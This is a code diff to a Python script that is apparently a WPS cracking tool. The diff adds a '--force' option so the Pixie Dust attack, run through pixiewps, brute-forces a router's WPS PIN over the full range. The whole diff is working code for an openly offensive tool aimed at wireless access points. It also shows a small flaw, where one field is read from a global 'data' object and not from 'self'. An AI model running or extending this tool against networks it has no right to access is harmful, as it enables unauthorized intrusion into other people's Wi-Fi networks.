@@ -24,10 +24,12 @@ class Data():
     def got_all(self):
         return self.pke and self.pkr and self.e_nonce and self.authkey and self.e_hash1 and self.e_hash2
 
-    def get_pixie_cmd(self):
-        return "pixiewps --pke {} --pkr {} --e-hash1 {} --e-hash2 {} --authkey {} --e-nonce {}".format(
+    def get_pixie_cmd(self, full_range=False):
+        pixiecmd = "pixiewps --pke {} --pkr {} --e-hash1 {} --e-hash2 {} --authkey {} --e-nonce {}".format(
             self.pke, data.pkr, self.e_hash1, self.e_hash2, self.authkey, self.e_nonce)
-
+        if full_range:
+            pixiecmd += ' --force'
+        return pixiecmd
 
 class Options():
     def __init__(self):
@@ -36,6 +38,7 @@ class Options():
         self.pin = None
         self.essid = None
         self.pixiemode = False
+        self.full_range = False
         self.showpixiecmd = False
         self.verbose = False
 
@@ -255,6 +258,7 @@ Required Arguments:
 Optional Arguments:
     -p, --pin=<wps pin>      : Use the specified pin (arbitrary string or 4/8 digit pin)
     -K, --pixie-dust         : Run Pixie Dust attack
+    -F, --force              : Run Pixiewps with --force option (bruteforce full range)
     -X                       : Alway print Pixiewps command
     -v                       : Verbose output
 
@@ -273,12 +277,13 @@ if __name__ == '__main__':
     options = Options()
 
     import getopt
-    optlist, args = getopt.getopt(sys.argv[1:], ":e:i:b:p:XKv", ["help", "interface", "bssid", "pin", "pixie-dust"])
+    optlist, args = getopt.getopt(sys.argv[1:], ":e:i:b:p:XFKv", ["help", "interface", "bssid", "pin", "force", "pixie-dust"])
     for a, b in optlist:
         if a in ('-i', "--interface"): options.interface = b
         elif a in ('-b', "--bssid"): options.bssid = b.upper()
         elif a in ('-p', "--pin"): options.pin = b
         elif a in ('-K', "--pixie-dust"): options.pixiemode = True
+        elif a in ('-F', "--force"): options.full_range = True
         elif a in ('-X'): options.showpixiecmd = True
         elif a in ('-v'): options.verbose = True
         elif a == '--help': usage()
@@ -304,7 +309,7 @@ if __name__ == '__main__':
         sys.exit(0)
 
     elif data.got_all() and options.pixiemode:
-        pixiecmd = data.get_pixie_cmd()
+        pixiecmd = data.get_pixie_cmd(options.full_range)
         print("Running Pixiewps...")
         if options.verbose or options.showpixiecmd: print("Cmd: {}".format(pixiecmd))
         out = shellcmd(pixiecmd)
